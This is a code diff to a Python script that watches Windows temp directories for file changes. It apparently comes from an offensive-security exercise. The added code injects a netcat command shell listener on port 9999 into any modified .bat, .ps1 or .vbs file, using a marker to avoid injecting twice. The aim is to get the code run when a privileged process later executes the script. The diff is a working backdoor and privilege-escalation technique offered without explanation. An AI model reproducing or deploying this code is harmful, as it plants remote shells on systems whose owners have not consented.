@@ -10,9 +10,32 @@ FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
+BIN = 'c:\\users\\eric\\desktop\\netcat.ext'
+TGT_IP = '192.168.127.132'
+CMD = f'{BIN} -t {TGT_IP} -p 9999 -l -c'
+
+# file extensions to monitor and code to inject for each type, use marker to prevent multiple injections
+FILE_TYPES = {
+    '.bat': ["\r\nREM bhpmarker\r\n", f'\r\n{CMD}\r\n'],
+    '.ps1': ["\r\n# bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
+    '.vbs': ["\r\n'bhpmarker\r\n", f'\r\nCreateObject("Wscript.Shell").Run "{CMD}")\r\n'],
+}
+
 FILE_LIST_DIRECTORY = 0x0001
 # directories to monitor for file changes
 PATHS = ['c:\\windows\\temp', tempfile.gettempdir()]
+
+def inject_code(full_filename, contents, extension):
+    # check for marker in file to prevent multiple injections
+    if FILE_TYPES[extension][0].strip() in contents:
+        return
+    # add marker and inject code
+    full_contents = FILE_TYPES[extension][0]
+    full_contents += FILE_TYPES[extension][1]
+    full_contents += contents
+    with open(full_filename, 'w') as f:
+        f.write(full_contents)
+    print('\\o/ Injected code.')
 
 def monitor(path_to_watch):
     # obtain handle to directory to monitor
@@ -50,15 +73,28 @@ def monitor(path_to_watch):
                     print(f'[-] Deleted: {full_filename}')
                 elif action == FILE_MODIFIED:
                     print(f'[*] Modified: {full_filename}')
+                    extension = os.path.splitext(full_filename)[1]
                     try:
                         print('[vvv] Dumping contents:')
-                        # dump contents of modified file to console
-                        with open(full_filename, 'r') as f:
+                        with open(full_filename) as f:
                             contents = f.read()
-                            print(contents)
-                            print('[^^^] End of file contents')
-                    except Exception as e:
-                        print(f'[!!!] Could not read file: {e}')
+                        # inject code into modified file
+                        if extension in FILE_TYPES:
+                            inject_code(full_filename, contents, extension)
+                        print(contents)
+                        print('[^^^] End of file contents')
+                    except Exception as e:                        
+                        print(f'[!!!] Could not read file for injection: {e}')
+
+                    # try:
+                        
+                    #     # dump contents of modified file to console
+                    #     with open(full_filename, 'r') as f:
+                    #         contents = f.read()
+                    #         print(contents)
+                    #         print('[^^^] End of file contents')
+                    # except Exception as e:
+                    #     print(f'[!!!] Could not read file: {e}')
 
                 elif action == FILE_RENAMED_FROM:
                     print(f'[>] Renamed from: {full_filename}')
